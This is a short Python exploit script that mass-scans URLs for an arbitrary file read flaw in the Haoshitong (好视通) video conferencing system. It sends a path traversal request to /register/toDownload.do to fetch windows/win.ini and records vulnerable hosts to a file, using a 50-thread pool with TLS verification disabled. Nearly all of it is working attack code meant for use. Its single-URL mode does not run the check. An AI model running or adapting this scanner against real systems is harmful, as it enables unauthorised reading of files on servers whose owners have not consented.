import argparse,sys,requests
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def poc(target):
    payload="/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
    headres={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Content-Length": "0"
    }
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    try:
        res1=requests.get(url=target,headers=headres,verify=False)
        if res1.status_code == 200:
            res2=requests.get(url=target+payload,headers=headres,verify=False)
            if 'MAPI=1' in res2.text:
                print(f"[+]{target}存在任意文件读取漏洞")
                with open('result1.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]该{target}不存在任意文件读取漏洞")
        else:
            print(f"[*]该{target}存在问题,请手工测试")        
    except:
        pass
def main():
    #定义
    parser=argparse.ArgumentParser(description="好视通视频会议系统存在任意文件读取漏洞复现")
    # 添加命令行参数
    parser.add_argument('-u','--url',dest='url',type=str,help='place input lik')
    parser.add_argument('-f','--file',dest='file',type=str,help='place input your le path')
    # 实例化
    args=parser.parse_args()
    # 判断用户的输入
    if args.url and not args.file:
        print(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage: python{sys.argv[0]} -h")
if __name__=='__main__':
    main()



